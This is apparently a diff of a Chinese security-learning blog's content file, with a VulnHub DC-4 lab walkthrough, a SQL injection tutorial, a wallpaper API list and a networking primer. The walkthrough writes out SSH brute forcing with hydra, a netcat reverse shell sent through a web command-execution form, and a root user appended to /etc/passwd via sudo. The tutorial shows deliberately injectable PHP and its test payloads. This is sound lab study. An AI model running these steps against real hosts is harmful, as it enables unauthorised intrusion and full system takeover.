+<p><img src="https://img.anineg.space/ncsuccess.png" alt="ncsuccess"></p>
+<p>进入交互模式，便于操作：<code>python -c 'import pty;pty.spawn("/bin/sh")'</code></p>
+<p>先搜刮一下目录：</p>
+<p><img src="https://img.anineg.space/jim.png" alt="jim"></p>
+<p>查看jim用户下的backups，发现确实是密码的备份，cat打开进行查看，确实是密码。</p>
+<p><img src="https://img.anineg.space/bak.png" alt="bak"></p>
+<p>看看其他文件，mbox访问被拒绝：</p>
+<p><img src="https://img.anineg.space/catother.png" alt="catother"></p>
+<p>把密码copy到本地，用 hydra进行爆破：</p>
+<p><code>hydra -l jim -P /home/kali/桌面/bak.txt ssh://192.168.3.95</code></p>
+<p><img src="https://img.anineg.space/hydrasuccess.png" alt="hydrasuccess"></p>
+<p>得到密码：</p>
+<blockquote>
+<p>jibril04</p>
+</blockquote>
+<p>使用ssh远程登陆：</p>
+<p><img src="https://img.anineg.space/sshin1.jpg" alt="sshin1"></p>
+<p>注意系统提示有新的邮件。</p>
+<p>找到邮件，发现 charles用户交给 jim用户保管的密码：</p>
+<p><img src="https://img.anineg.space/cdmail.png" alt="cdmail"></p>
+<p><img src="https://img.anineg.space/jimmail.png" alt="jimmail"></p>
+<p>得到用户名和密码：</p>
+<blockquote>
+<p>charles</p>
+<p>^xHhA&amp;hvim0y</p>
+</blockquote>
+<p>再次使用ssh远程登陆到charles ：</p>
+<p><img src="https://img.anineg.space/sshin2.png" alt="sshin2"></p>
+<p>查看用户权限发现，该用户可以以root权限免密码执行 /usr/bin/teehee</p>
+<p>进行提权，直接向/etc/passwd中增加内容：</p>
+<p>echo 命令与 sudo 命令配合使用，可以实现向那些只有系统管理员才有权限操作的文件中写入信息</p>
+<p>添加一个 hack用户，并使用teehee执行写入passwd中</p>
+<p><code>echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd</code></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">参数解释：</span><br><span class="line">admin:x:0:0::/home/admin:/bin/bash</span><br><span class="line">[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span><br><span class="line">"-a" 选项的作用等同于 "&gt;&gt;" 命令</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://img.anineg.space/image-20220725223345603.png" alt="image-20220725223345603"></p>
+<p>得到flag：<img src="https://img.anineg.space/flag.png" alt="flag"></p>
+<details class="folding-tag" cyan="" close=""><summary> 参考文章： </summary>
+              <div class="content">
+              <div class="tag link"><a class="link-card" title="菜鸟渗透日记24---DC-4靶机打靶过程详解" href="https://blog.csdn.net/leesir98/article/details/101620077"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">菜鸟渗透日记24---DC-4靶机打靶过程详解</p><p class="url">https://blog.csdn.net/leesir98/article/details/101620077</p></div></a></div><div class="tag link"><a class="link-card" title="DC-4靶机渗透指南（渗透测试详细操作）" href="https://blog.csdn.net/weixin_45671944/article/details/121747512"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">DC-4靶机渗透指南（渗透测试详细操作）</p><p class="url">https://blog.csdn.net/weixin_45671944/article/details/121747512</p></div></a></div><div class="tag link"><a class="link-card" title="【vulnhub】---DC-4靶机" href="https://blog.csdn.net/qq_43168364/article/details/106626917"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">【vulnhub】---DC-4靶机</p><p class="url">https://blog.csdn.net/qq_43168364/article/details/106626917</p></div></a></div>
+              </div>
+            </details>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>My Awesome Photoblog靶机学习记录</title>
     <url>/2022/08/08/Photoblog/</url>
     <content><![CDATA[<h1>关于靶机</h1>
@@ -380,496 +870,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SQL注入漏洞（一）</title>
-    <url>/2022/02/16/SQL1/</url>
-    <content><![CDATA[<h1>SQL 注入漏洞简介</h1>
-<h2 id="SQL-注入漏洞产生原因及危害">SQL 注入漏洞产生原因及危害</h2>
-<p>SQL 注入漏洞是指攻击者通过浏览器或者其他客户端将恶意 SQL 语句插入到网站参数中,而网站应用程序末对其进行过滤,将恶意 SQL语句带入数据库使恶意 SQL 语句得以执行,从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。<br>
-SQL 注入漏洞可能会造成服务器的数据库信息泄露、数据被窃取、网页被篡改,甚至可能会造成网站被挂马、服务器被远程控制、被安装后门等。</p>
-<h2 id="SQL-注入漏洞示例代码分析">SQL 注入漏洞示例代码分析</h2>
-<p>以下是 SQL 注入漏洞的示例代码：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql-"SELECT * FROM users WHBRE id=$id LIMIT O,1";</span><br><span class="line">$result=mysql_query(fsql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
-<p>中间件通过 <code>$_GET['id']</code> 获取用户输入的 id 参数的值,并赋值给<code>$id</code> 这个变量。<code>$id</code> 在后面没有经过任何过滤,直接拼接到 SQL 语句中,然后在数据库中执行了此 SQL 语句。<br>
-如果用户提交 <code>index.php?id=1 and 1=1</code>，那么后面的 SQL 语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</code>，会有正常的结果返回。<br>
-如果用户提交 <code>index.php?id=1 and 1=2</code>，那么后面的 SQL 语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1</code>，会有不正常的结果返回。</p>
-<h2 id="SQL注入分类">SQL注入分类</h2>
-<p>SQL注入按照数据类型分为<span class="p red">数字型注入</span>和<span class="p red">字符型注入</span>。注入点的数据类型为数字型时为数字型注入,注入点的数据类型为字符型时为字符型注入。<br>
-SQL注入按照服务器返回信息是否显示分为报错注入和盲注。如果在注入的过程中,程序将获取的信息或者报错信息直接显示在页面中,这样的注入为报错注入;如果在注入的过程中,程序不显示任何SQL报错信息,只能通过精心构造SQL语句,根据页面是否正常返回或者返回的时间判断注入的结果,这样的注入为盲注。</p>
-<h1>数字型注入</h1>
-<p>数字型注入就是注入点的数据类型是数字型,没有用单引号引起来。数字型注入的典型示例代码如下:</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";    //$id没有单引号</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
-<p>在 <code>WHERE id=$id</code>这个SQL语句的子句中,<code>$id</code>变量没有用单引号或者双引号引起来,而是直接拼接到了后面,这样的注入就是典型的数字型注入。</p>
-<h2 id="判断数字型注入的方法如下">判断数字型注入的方法如下:</h2>
-<h3 id="输入单引号-不正常返回。">输入单引号,不正常返回。</h3>
-<p>如果用户提交 <code>index.php?id=1'</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1' LIMIT 0,1</code>,SQL语句本身存在语法错误,会有不正常的结果返回。</p>
-<h3 id="输入and-1-1-正常返回。">输入<code>and 1=1</code>,正常返回。</h3>
-<p>如果用户提交 <code>index.php?id=1 and 1=1</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</code>,会有正常的结果返回。</p>
-<h3 id="输入and-1-2-不正常返回">输入<code>and 1=2</code>,不正常返回</h3>
-<p>如果用户提交 <code>index.php?id=1 and 1=2</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1</code>,会有不正常的结果返回。<br>
-数字型注入的注入点主要通过上面3个语句来判断,如果输入的返回结果与上面相符,说明测试语句中的恶意SQL语句被带入数据库中并且成功执行,那么就可能存在数字型注入。具体有没有数字型注入,是否可以通过数字型注入获取有效信息,还需要大量的测试来验证。</p>
-<h1>字符型注入</h1>
-<p>字符型注入就是注入点的数据类型是字符型。字符型注入与数字型注入的区别就是字符型注入要用一对单引号引起来。字符型注入的典型示例代码如下：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";    //'$id'有单引号</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
-<p>这个示例代码与数字型注入的示例代码基本一致,只是在后面的SQL语句拼接中,<code>$id</code>多了一对单引号,<code>$id</code>是字符型数据,这就是典型的字符型注入。</p>
-<h2 id="判断字符型注入的方法如下">判断字符型注入的方法如下:</h2>
-<h3 id="输入单引号-不正常返回。-v2">输入单引号,不正常返回。</h3>
-<p>如果用户提交 <code>index,php?id=1'</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1' LIMIT 0,1</code>,SQL语句本身存在语法错误,会有不正常的结果返回。</p>
-<h3 id="输入-and-1-1-正常返回">输入<code>'and'1'='1</code>,正常返回</h3>
-<p>如果用户提交 <code>index.php?id=1 'and' 1'='1</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id='1' and '1'='1' LIMIT 0,1</code>,会有正常的结果返回。</p>
-<h3 id="输入-and-1-2-不正常返回">输入<code>'and'1'='2</code>,不正常返回</h3>
-<p>如果用户提交 <code>index.php?id=1 'and' 1'='2</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1</code>,会有不正常的结果返回。<br>
-字符型注入的注入点主要通过上面3个语句来判断,如果输入的返回结果与上面相符,说明测试语句中的恶意SQL语句被带入数据库中并且成功执行,那么就可能存在字符型注入。具体有没有字符型注入,是否可以通过字符型注入获取有效信息,还需要大量的测试来验证。</p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>随机背景API接口整理</title>
-    <url>/2022/03/20/backgroundAPI/</url>
-    <content><![CDATA[<h1>废话不多说，上图！（每次刷新都不一样哦~）</h1>
-<p>（API链接在后面）</p>
-<p><img src="https://api.mtyqx.cn/api/random.php" alt=""></p>
-<p><img src="https://api.mtyqx.cn/tapi/random.php" alt=""></p>
-<p><img src="https://api.ixiaowai.cn/api/api.php" alt=""></p>
-<p><img src="https://api.ixiaowai.cn/mcapi/mcapi.php" alt=""></p>
-<p><img src="https://acg.toubiec.cn/random.php" alt=""></p>
-<p><img src="https://www.dmoe.cc/random.php" alt=""></p>
-<p><img src="https://api.paugram.com/wallpaper/?source=sina&amp;category=us" alt=""></p>
-<h1>API接口链接</h1>
-<h2 id="必应壁纸">必应壁纸</h2>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.dujin.org/bing/1366.php (1366*768)</span><br><span class="line">https://api.dujin.org/bing/1920.php (1920*1080)</span><br><span class="line">https://api.dujin.org/bing/m.php    (1080*1920)</span><br><span class="line">//api.timecdn.cn/libs/wallpaper/v1  (1920*1080)</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="http://api.timecdn.cn/libs/wallpaper/v1" alt=""></p>
-<center>今日必应壁纸</center>
-<h2 id="野生动漫-API">野生动漫 API</h2>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.mtyqx.cn/api/random.php</span><br><span class="line">https://api.mtyqx.cn/tapi/random.php</span><br></pre></td></tr></tbody></table></figure>
-<h2 id="系列-API（需自己按照网站说明调用-API-参数）">系列 API（需自己按照网站说明调用 API 参数）</h2>
-<blockquote>
-<p>小歪 API</p>
-<p><a href="https://api.ixiaowai.cn/">https://api.ixiaowai.cn</a></p>
-</blockquote>
-<blockquote>
-<p>未知名称动漫 API</p>
-<p><a href="https://acg.toubiec.cn/">https://acg.toubiec.cn</a></p>
-</blockquote>
-<blockquote>
-<p>樱花 API</p>
-<p><a href="http://www.dmoe.cc/">http://www.dmoe.cc/</a></p>
-</blockquote>
-<blockquote>
-<p>岁月小筑随机背景 API</p>
-<p><a href="https://img.xjh.me/">https://img.xjh.me</a></p>
-</blockquote>
-<blockquote>
-<p>保罗 API</p>
-<p><a href="https://api.paugram.com/help/wallpaper/">https://api.paugram.com/help/wallpaper/</a></p>
-</blockquote>
-<blockquote>
-<p>樱道随机图片</p>
-<p><a href="https://img.r10086.com/">https://img.r10086.com/</a></p>
-</blockquote>
-<blockquote>
-<p>墨天逸</p>
-<p><a href="http://api.mtyqx.cn/">http://api.mtyqx.cn</a></p>
-</blockquote>
-<blockquote>
-<p>Unsplash</p>
-<p><a href="https://source.unsplash.com/">https://source.unsplash.com/</a></p>
-</blockquote>
-<blockquote>
-<p>后宫漫图：</p>
-<p><a href="https://acg.sx/images">https://acg.sx/images</a></p>
-</blockquote>
-<blockquote>
-<p>EEEDOG</p>
-<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
-</blockquote>
-<blockquote>
-<p>东方 Project</p>
-<p><a href="https://img.paulzzh.tech/">https://img.paulzzh.tech/</a></p>
-</blockquote>
-<blockquote>
-<p>搏天 API</p>
-<p><a href="https://api.btstu.cn/doc/sjbz.php">https://api.btstu.cn/doc/sjbz.php</a></p>
-</blockquote>
-<blockquote>
-<p>汐岑 ACG</p>
-<p><a href="https://acg.yanwz.cn/">https://acg.yanwz.cn</a></p>
-</blockquote>
-<blockquote>
-<p>凌一 API</p>
-<p><a href="https://api.lyiqk.cn/">https://api.lyiqk.cn</a></p>
-</blockquote>
-<blockquote>
-<p>Lorem Picsum</p>
-<p><a href="https://picsum.photos/">https://picsum.photos/</a></p>
-</blockquote>
-<blockquote>
-<p>API 接口文档 - 夏沫博客</p>
-<p><a href="https://cdn.seovx.com/">https://cdn.seovx.com/</a></p>
-</blockquote>
-<blockquote>
-<p>Ushio API</p>
-<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
-</blockquote>
-<blockquote>
-<p>点滴 API</p>
-<p><a href="https://api.ddkjt.com/">https://api.ddkjt.com/</a></p>
-</blockquote>
-<blockquote>
-<p>Langford’s API</p>
-<p><a href="https://api.ucany.net/">https://api.ucany.net/</a></p>
-</blockquote>
-<blockquote>
-<p>一铭 API</p>
-<p><a href="https://api.wer.plus/product/doc?id=2">https://api.wer.plus/product/doc?id=2</a></p>
-<p><a href="https://api.wer.plus/product/doc?id=3">https://api.wer.plus/product/doc?id=3</a></p>
-</blockquote>
-<blockquote>
-<p>R0A1NG’s API<br>
-<a href="https://api.roaing.com/#/doc/dongmanimg">https://api.roaing.com/#/doc/dongmanimg</a></p>
-</blockquote>
-<blockquote>
-<p>JacksonXE の API<br>
-<a href="https://api.jacksonxe.cn/api/file/random?sole=">https://api.jacksonxe.cn/api/file/random?sole=</a></p>
-</blockquote>
-<div class="tag link"><a class="link-card" title="随机壁纸API整理" href="https://quest.myxxts.club/archives/54/"><div class="left"><img src="https://sdn.geekzu.org/avatar/b78149ae3a65c308a991d61840da7225?s=&amp;r=&amp;d="></div><div class="right"><p class="text">随机壁纸API整理</p><p class="url">https://quest.myxxts.club/archives/54/</p></div></a></div>
-]]></content>
-      <categories>
-        <category>博客</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>VulnHub——DC-1靶机学习记录</title>
-    <url>/2022/09/24/dc1/</url>
-    <content><![CDATA[<h1>关于DC-1</h1>
-<blockquote>
-<p>DC-1是一个专门建造的易受攻击的实验室，目的是获得渗透测试领域的经验。</p>
-<p>它的设计对初学者来说是一个挑战，但它的容易程度将取决于你的技能和知识，以及你的学习能力。</p>
-<p>要成功完成此挑战，您需要Linux技能，熟悉Linux命令行并具有基本渗透测试工具的经验，例如可以在Kali Linux或鹦鹉安全操作系统上找到的工具。</p>
-<p>有多种方法可以获得root，但是，我提供了一些包含初学者线索的标志。</p>
-<p>总共有五个标志，但最终目标是在 root 的主目录中查找并读取该标志。您甚至不需要成为root才能执行此操作，但是，您将需要root权限。</p>
-<p>根据您的技能水平，您可以跳过查找大多数这些标志并直接进入root。</p>
-<p>初学者可能会遇到他们以前从未遇到过的挑战，但是Google搜索应该是获取完成此挑战所需的信息所需的全部内容。</p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>DC- 1</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>发布日期</td>
-<td>2019年2月28日</td>
-</tr>
-<tr>
-<td>作者</td>
-<td>DCAU</td>
-</tr>
-<tr>
-<td>系列</td>
-<td>DC</td>
-</tr>
-<tr>
-<td>网页</td>
-<td><a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></td>
-</tr>
-</tbody>
-</table>
-<h1>环境</h1>
-<p>靶机：DC-1（IP:192.168.）</p>
-<p>攻击机：KALI（IP:192.168.3.96）</p>
-<p>平台：VMware 16.2.4</p>
-<h1>信息收集</h1>
-<p><strong>主机发现</strong></p>
-<p><code>arp-scan -l</code></p>
-<hr>
-<p>待更新</p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>靶机</tag>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>IP地址详解</title>
-    <url>/2022/03/17/cgrona1/</url>
-    <content><![CDATA[<h1>0x01 IP（IPv4）</h1>
-<p>IP地址是唯一的标识，分为a、b、c、d四个字段，形式为X.X.X.X，每个字段都由32位的二进制数字构成，所以每个字段范围都是0-255（但我们可以使用的IP不包括0和255）</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">如：10.2.1.1 、 192.168.1.1</span><br></pre></td></tr></tbody></table></figure>
-<h1>0x02 子网掩码</h1>
-<ol>
-<li><strong>局域网通信规则</strong>：在同一局域网中，所有的IP必须在同一网段中才可以互相通信</li>
-<li><strong>IP地址构成</strong>：网络位+主机位（网络位相同的IP地址，属于同一网段）</li>
-<li><strong>子网掩码</strong>：每一个IP地址必须配一个子网掩码，用来确定IP地址的网络位</li>
-</ol>
-<p><strong>子网掩码如何确定网络位</strong>：与<strong>255</strong>对应的数字为<strong>网络位</strong>，与<strong>0</strong>对应的数字为<strong>主机位</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">255.0.0.0  、 255.255.0.0  、 255.255.255.0</span><br><span class="line">PLAINTEXT</span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.0.0.0</span><br><span class="line">则10.1.1.1属于10.0.0.0这个网段，主机名字叫1.1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.0.0</span><br><span class="line">则10.1.1.1属于10.1.0.0这个网段，主机名字叫1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.255.0</span><br><span class="line">则10.1.1.1属于10.1.1.0这个网段，主机名字叫1</span><br></pre></td></tr></tbody></table></figure>
-<h1>0x03 IP地址详解</h1>
-<p>IP地址分为五大类（以IP地址的第一位进行区分）</p>
-<ul>
-<li><strong>A类</strong>： <strong>1-126</strong> 默认子网掩码：255.0.0.0</li>
-<li><strong>B类</strong>：<strong>128-191</strong> 默认子网掩码：255.255.0.0</li>
-<li><strong>C类</strong>：<strong>192-223</strong> 默认子网掩码：255.255.255.0</li>
-<li><strong>D类</strong>：<strong>224-239</strong> 组播地址</li>
-<li><strong>E类</strong>：<strong>240-254</strong> 科研使用</li>
-</ul>
-<p>注：</p>
-<p>1、目前我们可以使用的只有A、B、C 三类</p>
-<p>2、A、B、C 三类的子网掩码可以修改</p>
-<h2 id="3-1-127开头">3.1 127开头</h2>
-<p>这个开头只有一个地址：**127.0.0.1：**本地回环地址（永远代表自己）</p>
-<p>Ping这个地址代表跟自己通信（Ping它等于Ping自己）</p>
-<h2 id="3-2-广播地址">3.2 广播地址</h2>
-<p>主机位上全为255即为广播地址</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">如：</span><br><span class="line">10.1.1.1  255.255.0.0</span><br><span class="line">这个IP属于10.1.0.0这个网段，那么把主机位、或者说0这个位置全都换成255就是广播地址:10.1.255.255就是这个IP的广播地址</span><br></pre></td></tr></tbody></table></figure>
-<h1>0x04 网关</h1>
-<p><strong>网关（Gateway）</strong>：网络的出口，可以使不在同一个网段的IP通信，一般在路由器上</p>
-<p>通俗来讲就是访问互联网的通道</p>
-<p>路由器：可用连接内外网的设备</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">主机与主机之间互相通信:</span><br><span class="line">	首先判断目标IP地址与自己是否处在同一网段</span><br><span class="line">	若在同一网段，则直接发出去，而不找网关</span><br><span class="line">	若不在同一网段，则直接发包给网关</span><br></pre></td></tr></tbody></table></figure>
-<h1>0x05 DNS</h1>
-<p>DNS：Domain Name Service 域名服务</p>
-<p>用于<strong>解析网站域名</strong></p>
-<p>通过浏览器使用域名访问互联网：</p>
-<ul>
-<li>浏览器会先找是否有本地缓存（也就是之前是否访问过该网站）</li>
-<li>接着会找位于 C 盘的本地解析文件（host文件）</li>
-<li>本地没有的话，浏览器会向DNS服务器发起解析请求</li>
-</ul>
-<p>若直接访问 IP 地址的话则不需要DNS服务</p>
-<p>通过命令</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></tbody></table></figure>
-<p>可以查询该网址的 IP 地址以及帮你进行解析的 DNS</p>
-<p><a href="https://cgrona.top/2022/01/09/study/1.png"><img src="https://cgrona.vercel.app/2022/01/09/study/1.png" alt="img"></a></p>
-<h1>0x06 网络测试命令</h1>
-<ul>
-<li>
-<p>如何查看IP地址</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ipconfig # 查看IP地址基本信息</span><br><span class="line">ipconfig /all # 查看IP地址详细信息</span><br></pre></td></tr></tbody></table></figure>
-</li>
-<li>
-<p>测试网络连通性</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ping 目标IP地址 # 测试网络连通性，有回复即为可以成功通信</span><br><span class="line">ping -t 目标IP地址 # 一直ping</span><br><span class="line">ping -n 目标IP地址 # 修改ping包的数量</span><br><span class="line"></span><br><span class="line">注:若ping不通，可能对方不在线，或者对方开着防火墙</span><br></pre></td></tr></tbody></table></figure>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>转载</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>VulnHub——DC-4靶机学习记录</title>
-    <url>/2022/07/25/dc4/</url>
-    <content><![CDATA[<h1>关于DC-4</h1>
-<blockquote>
-<p>DC-4是另一个专门构建的易受攻击的实验室，旨在获得渗透测试领域的经验。</p>
-<p>与以前的DC版本不同，此版本主要为初学者/中级版本而设计。只有一个标志，但从技术上讲，有多个入口点，就像上次一样，没有线索。</p>
-<p>Linux技能和对Linux命令行的熟悉程度是必须的，基本的渗透测试工具的一些经验也是必须的。</p>
-<p>对于初学者来说，Google可以提供很大的帮助，但你可以随时在@DCAU7上发推文给我，寻求帮助，让你再次前进。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>DC- 4</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>发布日期</td>
-<td>2019年4月7日</td>
-</tr>
-<tr>
-<td>作者</td>
-<td>DCAU</td>
-</tr>
-<tr>
-<td>系列</td>
-<td>DC</td>
-</tr>
-<tr>
-<td>网页</td>
-<td><a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></td>
-</tr>
-</tbody>
-</table>
-<h1>环境</h1>
-<p>靶机：DC-4（IP:未知）</p>
-<p>攻击机：KALI（IP:192.168.3.96）</p>
-<p>平台：VMware 16.2.4</p>
-<h1>信息收集</h1>
-<p><strong>主机发现</strong></p>
-<p><code>arp-scan -l</code></p>
-<p><img src="https://img.anineg.space/scan1.png" alt="scan1"></p>
-<p><strong>使用nmap进行扫描主机</strong></p>
-<p><code>nmap -sS -Pn -A -p- -n 192.168.3.95</code></p>
-<p><img src="https://img.anineg.space/nmapss.png" alt="nmapss"></p>
-<p><code>nmap -sV -p- 192.168.3.95</code></p>
-<p><img src="https://img.anineg.space/nmapsv.png" alt="nmapsv"></p>
-<p><strong>web指纹识别</strong></p>
-<p><code>whatweb -v 192.168.3.95</code></p>
-<p><img src="https://img.anineg.space/whatweb.png" alt="whatweb"></p>
-<p><strong>网站目录扫描</strong></p>
-<p><code>dirb http://192.168.3.95 /usr/share/dirb/wordlists/big.txt</code></p>
-<p><img src="https://img.anineg.space/dirb.png" alt="dirb"></p>
-<h2 id="收集到的信息：">收集到的信息：</h2>
-<ul>
-<li>
-<p>靶机IP =&gt; 192.168.3.95</p>
-</li>
-<li>
-<p>开放的端口：</p>
-<ul>
-<li>22 =&gt; ssh服务 ---- OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</li>
-<li>80 =&gt; http服务 ---- nginx 1.15.10</li>
-</ul>
-<hr>
-</li>
-</ul>
-<h1>渗透测试</h1>
-<p>尝试用hydra进行爆破</p>
-<p><code>hydra -l root -P /root/top1000.txt -vV -t 10 -o ssh.txt 192.168.15.152 ssh -s 22</code></p>
-<p><img src="https://img.anineg.space/hydra1.png" alt="hydra1"></p>
-<p>爆不出来，先去网页端看一看有什么有用的信息。</p>
-<p>访问<code>http://192.168.3.95/</code></p>
-<p><img src="https://img.anineg.space/0010.png" alt="0010"></p>
-<p>打开网页，是一个登录界面，开始用BP进行爆破，得到密码：</p>
-<blockquote>
-<p>happy</p>
-</blockquote>
-<p><img src="https://img.anineg.space/baopo.png" alt="baopo"></p>
-<p>登录进入，发现有可以执行命令的地方：</p>
-<p><img src="https://img.anineg.space/login.png" alt="login"></p>
-<p><img src="https://img.anineg.space/run.png" alt="run"></p>
-<p>使用BP进行抓包，发现可以修改命令：</p>
-<p><img src="https://img.anineg.space/bp1.png" alt="bp1"></p>
-<p><img src="https://img.anineg.space/bp2.png" alt="bp2"></p>
-<p><img src="https://img.anineg.space/fire1.png" alt="fire1"></p>
-<p>先执行一个反弹shell的命令：<code>nc -e /bin/bash 192.168.3.95 4444</code></p>
-<p>执行之前现在kali上监听4444端口：<code>nc -lnvp 4444</code></p>
-<p><img src="https://img.anineg.space/listen.png" alt="listen"></p>
-<p><img src="https://img.anineg.space/bp4.png" alt="bp4"></p>
-<p>getshell成功：</p>
-<p><img src="https://img.anineg.space/ncsuccess.png" alt="ncsuccess"></p>
-<p>进入交互模式，便于操作：<code>python -c 'import pty;pty.spawn("/bin/sh")'</code></p>
-<p>先搜刮一下目录：</p>
-<p><img src="https://img.anineg.space/jim.png" alt="jim"></p>
-<p>查看jim用户下的backups，发现确实是密码的备份，cat打开进行查看，确实是密码。</p>
-<p><img src="https://img.anineg.space/bak.png" alt="bak"></p>
-<p>看看其他文件，mbox访问被拒绝：</p>
-<p><img src="https://img.anineg.space/catother.png" alt="catother"></p>
-<p>把密码copy到本地，用 hydra进行爆破：</p>
-<p><code>hydra -l jim -P /home/kali/桌面/bak.txt ssh://192.168.3.95</code></p>
-<p><img src="https://img.anineg.space/hydrasuccess.png" alt="hydrasuccess"></p>
-<p>得到密码：</p>
-<blockquote>
-<p>jibril04</p>
-</blockquote>
-<p>使用ssh远程登陆：</p>
-<p><img src="https://img.anineg.space/sshin1.jpg" alt="sshin1"></p>
-<p>注意系统提示有新的邮件。</p>
-<p>找到邮件，发现 charles用户交给 jim用户保管的密码：</p>
-<p><img src="https://img.anineg.space/cdmail.png" alt="cdmail"></p>
-<p><img src="https://img.anineg.space/jimmail.png" alt="jimmail"></p>
-<p>得到用户名和密码：</p>
-<blockquote>
-<p>charles</p>
-<p>^xHhA&amp;hvim0y</p>
-</blockquote>
-<p>再次使用ssh远程登陆到charles ：</p>
-<p><img src="https://img.anineg.space/sshin2.png" alt="sshin2"></p>
-<p>查看用户权限发现，该用户可以以root权限免密码执行 /usr/bin/teehee</p>
-<p>进行提权，直接向/etc/passwd中增加内容：</p>
-<p>echo 命令与 sudo 命令配合使用，可以实现向那些只有系统管理员才有权限操作的文件中写入信息</p>
-<p>添加一个 hack用户，并使用teehee执行写入passwd中</p>
-<p><code>echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd</code></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">参数解释：</span><br><span class="line">admin:x:0:0::/home/admin:/bin/bash</span><br><span class="line">[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span><br><span class="line">"-a" 选项的作用等同于 "&gt;&gt;" 命令</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="https://img.anineg.space/image-20220725223345603.png" alt="image-20220725223345603"></p>
-<p>得到flag：<img src="https://img.anineg.space/flag.png" alt="flag"></p>
-<details class="folding-tag" cyan="" close=""><summary> 参考文章： </summary>
-              <div class="content">
